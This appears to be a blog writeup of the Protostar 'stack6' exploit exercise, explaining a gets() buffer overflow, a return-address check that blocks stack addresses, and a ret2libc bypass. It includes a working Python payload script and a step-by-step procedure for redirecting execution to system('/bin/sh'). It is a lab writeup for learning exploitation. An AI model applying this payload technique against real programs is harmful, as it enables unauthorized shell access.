---
layout: post
title: "stack6 Protostar writeup"
categories: protostar
---

This is a writeup for [stack level 6](https://exploit-exercises.com/protostar/stack6).

Checking the disassembly, the `main` function calls `getpath`. In `getpath` the vulnerable function `gets`  is called for string at address `$ebp-0x4c`. (We know that `return`  address lies at `$ebp+0x4`).
But there is a catch. Unlike [Stack5](https://karthikbhata97.github.io/protostar/2018/09/16/Protostar-Stack5-Writeup.html), we cannot use stack address as the new return address after buffer overflow.

![disassembly](/data/stack6/stack6.png)

We can see that, when the `ret & 0xbf000000` is `0xbf000000`, it calls `exit` to exit the program thus the updated return value is not used. This is a simple implementation of preventing code execution on stack. There are hardware implementation for this like [`NX` bit](https://en.wikipedia.org/wiki/NX_bit).

### Ret2libc
`libc` is the C standard library which will be used by the C program to uses library functions. This means, it will contain the code (object code) for functions like `system`, `exec`, `exit` etc.

`libc` is a dynamic library, and we will use the function `system` which helps in executing commands. We have to find a way to jump to the function `system` and send `/bin/sh` as the argument. Thus when calling `system` stack should look like,

![Stack](/data/stack6/stack6_libc_stack.png)

We'll get all these address as offset in the libc so that we can add them with the base address where libc loads.
![Libc offsets](/data/stack6/stack6_libc_offset.png)


Now we will get the libc base address from the memory mappings using gdb.
gdb command `info proc mappings` gives up the memory mapping for the process being currently run.
![Libc base address](/data/stack6/stack6_libc_base.png) 


Now we have everything we need, using [this](/data/stack6/ret2libc.py) python script, we will create payload,
```
#! /usr/bin/python2.7

import struct
import sys

baddr = int(sys.argv[1], 16) # address where libc loads
system_off = baddr + 0x00038fb0
exit_off = baddr + 0x0002f0c0
binsh_off = baddr + 0x11f3bf

pad = 'A' * 0x50

payload = pad + struct.pack("I", system_off) + struct.pack("I", exit_off) + struct.pack("I", binsh_off)
print(payload)
```

Here padding is `0x50` because, the input string is at `$ebp-0x4c` and the `return pointer` will be at `$ebp+0x4`. Also we are supplying the libc base address as an argument.

![Shell](/data/stack6/ret2libc_pwn.png)

#### Procedure
- Place address to `system` at $ebp+0x4
- Place address to `exit` at $ebp+0x8. This is optional since we don't worry if the program successfuly exits once we exit shell.
- Place address of the string `"/bin/sh"` at $ebp+0xc
- Get the address where libc loads since all the above address are offset to this (add offset to base address).
- Because of buffer overflow control flow will go to system and thus getting us a shell.
